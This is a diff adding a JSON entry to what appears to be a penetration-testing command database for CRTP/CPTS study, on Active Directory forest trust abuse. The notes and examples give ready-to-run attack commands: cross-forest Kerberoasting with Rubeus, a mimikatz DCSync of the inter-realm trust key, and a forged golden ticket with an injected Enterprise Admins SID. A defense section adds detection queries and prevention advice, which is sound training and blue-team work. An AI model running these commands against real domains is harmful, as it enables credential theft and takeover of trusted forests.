@@ -1,0 +1,102 @@
+{
+  "id": "ad-custom-forest-trust",
+  "name": "Forest Trust Abuse - Cross-Forest Attacks",
+  "command": "Get-ADTrust -Filter * | Select Name, Direction, ForestTransitive, SIDFilteringForestAware, TrustType",
+  "description": "Forest trusts enable access between separate AD forests. If SID Filtering is relaxed (ForestTransitive or SIDFilteringForestAware), cross-forest attacks are possible via SID History injection in golden tickets. Even with SID Filtering, Kerberoasting, password spraying, and shared resource enumeration work across forest boundaries.",
+  "platform": "windows",
+  "type": "attack-chain",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "Trust Abuse",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "CRTP trust abuse module; forest trust escalation",
+  "tags": [
+    "forest-trust",
+    "cross-forest",
+    "sid-filtering",
+    "trust-abuse",
+    "inter-forest",
+    "kerberoast"
+  ],
+  "mitre": [
+    "T1482",
+    "T1134.005"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== ENUMERATE TRUSTS ===\n  Get-ADTrust -Filter * | Select Name, Direction, ForestTransitive, SIDFilteringForestAware, TrustType\n  # Or with PowerView:\n  Get-DomainTrust\n  Get-ForestTrust\n\n=== CROSS-FOREST KERBEROAST ===\n  # Works regardless of SID Filtering:\n  Rubeus.exe kerberoast /domain:<foreign_domain> /dc:<foreign_dc>\n  # Or from Linux:\n  GetUserSPNs.py <foreign_domain>/<user>:<pass> -dc-ip <foreign_dc>\n\n=== CROSS-FOREST GOLDEN TICKET (if SID Filtering disabled) ===\n  # Get inter-realm trust key:\n  mimikatz# lsadump::dcsync /user:<foreign_domain>$\n  # Forge inter-realm TGT with SIDHistory:\n  mimikatz# kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /rc4:<trust_key> /service:krbtgt /target:<foreign_domain> /sids:S-1-5-21-<foreign_sid>-519 /ticket:cross_forest.kirbi\n\n=== SHARED RESOURCES ===\n  # Enumerate shares across trust:\n  Find-DomainShare -CheckShareAccess -Domain <foreign_domain>\n  # Enumerate foreign group members:\n  Get-DomainForeignGroupMember -Domain <foreign_domain>\n  # Find users with access across trust:\n  Get-DomainForeignUser -Domain <foreign_domain>\n\n=== SID FILTERING CHECK ===\n  netdom trust <domain> /d:<foreign_domain> /quarantine\n  # Or: nltest /domain_trusts /v",
+  "examples": [
+    {
+      "label": "Enumerate forest trusts",
+      "command": "Get-ADTrust -Filter * | Select Name, Direction, ForestTransitive, SIDFilteringForestAware, TrustType"
+    },
+    {
+      "label": "Cross-forest Kerberoast",
+      "command": "Rubeus.exe kerberoast /domain:partner.com /dc:dc01.partner.com"
+    },
+    {
+      "label": "Find shared resources across trust",
+      "command": "Find-DomainShare -CheckShareAccess -Domain partner.com"
+    }
+  ],
+  "references": [
+    {
+      "title": "MITRE T1482 - Domain Trust Discovery",
+      "url": "https://attack.mitre.org/techniques/T1482/"
+    },
+    {
+      "title": "ADSecurity - Trust Abuse",
+      "url": "https://adsecurity.org/?p=282"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-sid-history-persistence",
+      "note": "SID History injection in golden tickets for cross-forest escalation.",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-golden-ticket",
+      "note": "Golden Ticket with extra SIDs for cross-forest access.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Forest trusts create authentication pathways between forests. SID Filtering is the primary defense, but when disabled (ForestTransitive trusts), cross-forest SID injection in Kerberos tickets grants privileges in the trusted forest.",
+    "prerequisites": "Domain Admin in one forest; forest trust relationship; SID Filtering disabled for full compromise (Kerberoast works regardless).",
+    "impact": "Cross-forest privilege escalation; compromise of the trusted forest from the trusting forest.",
+    "detection": "[MITRE T1482] Trust enumeration commands; cross-forest authentication events; SID History in cross-forest tickets.",
+    "artifacts": "Event 4769 (TGS) with cross-forest service names; nltest/netdom in command history; Event 4624 from foreign forest.",
+    "splunk_spl": "index=windows EventCode=4769 ServiceName=\"krbtgt/*\"\n| where ServiceName!=(\"krbtgt/\" + TargetDomainName)\n| table _time, TargetUserName, ServiceName, IpAddress",
+    "elastic_kql": "event.code:\"4769\" AND service.name:krbtgt*",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 4769\n| where ServiceName startswith \"krbtgt/\" and ServiceName !has TargetDomainName\n| project TimeGenerated, TargetUserName, ServiceName, IpAddress",
+    "sigma_rules": "win_security_cross_forest_trust_abuse",
+    "prevention": "Enable SID Filtering on all forest trusts; use Selective Authentication; minimize cross-forest trust relationships; audit inter-forest access regularly.",
+    "sources": [
+      "CRTP trust module",
+      "https://attack.mitre.org/techniques/T1482/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Cross-forest Kerberos authentication",
+        "logic": "SecurityEvent\n| where EventID == 4769\n| where ServiceName startswith \"krbtgt/\"\n| extend TargetForest = extract(@\"krbtgt/(.*)\", 1, ServiceName)\n| where TargetForest != \"\" and TargetForest != TargetDomainName\n| project TimeGenerated, TargetUserName, ServiceName, TargetForest, IpAddress",
+        "data_source": "windows-security",
+        "log_ids": [
+          "4769"
+        ],
+        "attack": [
+          "T1482",
+          "T1134.005"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "Legitimate cross-forest resource access; multi-forest environments",
+        "tuning": "Baseline normal cross-forest authentication; alert on unusual users or volumes"
+      }
+    ]
+  }
+}
